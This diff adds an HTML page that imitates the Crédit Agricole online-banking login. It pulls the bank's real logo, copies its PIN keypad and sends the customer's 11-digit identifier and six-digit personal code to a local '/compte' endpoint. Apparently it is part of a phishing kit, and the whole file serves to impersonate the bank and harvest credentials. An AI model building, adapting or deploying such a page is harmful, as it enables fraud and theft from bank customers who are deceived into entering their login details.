@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Connexion à votre compte - Credit Agricole</title>
+</head>
+<style>
+    @font-face {
+      font-family: 'Gotham, "Open Sans", sans-serif;';
+      src: url("font/got_simple.otf") format("opentype");
+      font-weight: normal;
+      font-style: normal;
+    } 
+
+    .vrai_ombre{
+      -webkit-box-shadow: -3px 0px 15px 6px rgba(0,0,0,0.16); 
+box-shadow: -3px 0px 15px 6px rgba(0,0,0,0.16);
+    }
+
+    body {
+      font-family: 'Gotham, "Open Sans", sans-serif;';
+      background-color: #f7f8fa;
+    }
+  </style>
+<body class="h-full">
+    <!-- Zone Header -->
+    <header class="flex justify-between max-h-[4rem] bg-white md:fixed md:top-0 md:w-full">
+        <div class="flex justify-center items-center md:justify-between w-full">
+            <img class="" src="https://www.credit-agricole.fr/content/dam/assetsca/cr848/npc/images/logos/logoCA-NoText.png" alt="">
+        </div>
+        <div class="bg-[#007461] justify-center items-center flex w-[4rem]">
+            <img src="/images/close-login.png" alt="">
+        </div>
+    </header>
+
+    <!-- Zone Main -->
+    <section class="mt-12 md:pt-[15px] px-3 md:px-0 flex gap-20 ">
+
+        <div class="hidden md:block">
+          <img  src="/images/banner-login.png" alt="">
+        </div>
+
+         <!-- Zone 2 -->
+        <div class="md:flex md:gap-32 md:justify-center">
+          <div class="md:flex mt-7 gap-14">
+          <div class="w-full pt-9">
+            <form action="/compte" method="get">
+            <p class="text-3xl md:py-10 font-bold text-[#071621]">ACCÉDER À MES
+              COMPTES</p>
+              <p class="mt-4 font-bold text-[#071621]">IDENTIFIANT</p>
+              <p class="text-sm mt-1 text-[#071621]">Saisissez votre identifiant à 11 chiffres</p>
+              <input type="text" name="identifiant" maxlength="11" required class="rounded-lg outline-1 hover:outline outline-[#007461] py-3 px-4 mt-4 w-full bg-[#e8f0fe] border-[#cad1dd] border" placeholder="Exemple 98652706859">
+  
+            <!-- Zone du Code PIN -->
+                  <div class="flex justify-between mt-4">
+                      <p class=" font-bold text-[#071621]">CODE PERSONNEL</p>
+                      <p class="underline text-sm text-[#007461]">Perdu / Oublié ?</p>
+                    </div>
+                    <div class="rounded-lg bg-[#e8f0fe] flex outline-1 hover:outline outline-[#007461] gap-5 py-3 px-4 mt-4 w-full  border-[#cad1dd] border" >
+                      <input class="bg-[#e8f0fe] outline-none w-full no-pointer-events" name="code" type="password" required id="pinInput" maxlength="6"  placeholder="Tapez votre code dans le pavé numérique ci-dessous" onkeydown="return false;">
+                      <div class="numkey" onclick="clearInput()">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon text-[#007461] icon-tabler icon-tabler-x" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M18 6l-12 12" /><path d="M6 6l12 12" /></svg>
+                      </div>
+                    </div>
+    
+                    <div class="mt-6">
+                      <!-- Numeric divs -->
+                      <div class="w-full flex gap-2 font-bold">
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(1)">1</div>
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(2)">2</div>
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(3)">3</div>
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(4)">4</div>
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(5)">5</div>  
+                      </div>
+                      
+                      <div class="w-full flex gap-2 mt-3 font-bold">
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(6)">6</div>
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(7)">7</div>
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(8)">8</div>
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(9)">9</div>
+                        <div class="bg-[#e8f0fe] rounded-md w-full px-6 py-3" onclick="addNumber(0)">0</div>
+                      </div>
+                      <div class="text-sm mt-6 text-red-900">
+                      
+                      </div>
+                      <button class="uppercase mt-5 bg-[#007461] text-white py-3 rounded-full font-bold text-center w-full ">valider</button>
+                      <img class="mt-6 mb-18 h-auto w-auto md:hidden" src="/images/bottom-login-mobile.png" alt="">      
+                    </div>
+                  </form>
+            </div>
+          </div>
+          
+
+            <!-- Zone2 -->
+            <div class="w-full pt-9">
+              <img class="mt-6 mb-18 h-auto w-auto hidden md:block" src="/images/cote-pc-login.png" alt="">      
+            </div>
+        </div>
+      </section>
+
+      <!-- FIN -->
+    <div class="bg-[#071621] hidden md:block">
+      <div class="justify-center flex py-6">
+        <img src="/images/logo-twitter.png" alt="">
+      </div>
+      <div class="flex justify-center">
+        <img class="flex-shrink-0" src="/images/droite-bas.png" alt="">
+      </div>
+      <div class="w-full bg-[#000000] py-12 flex justify-center">
+        <img class="w-[60%]" src="/images/bas-pc.png" alt="">
+      </div>
+    </div>
+</body>
+  
+  <script>
+    function addNumber(num) {
+      var input = document.getElementById('pinInput');
+      if (input.value.length < 6) {
+          input.value += num;
+      }
+    }
+
+    function clearInput() {
+        document.getElementById('pinInput').value = '';
+    }
+  </script>
+
+</html>
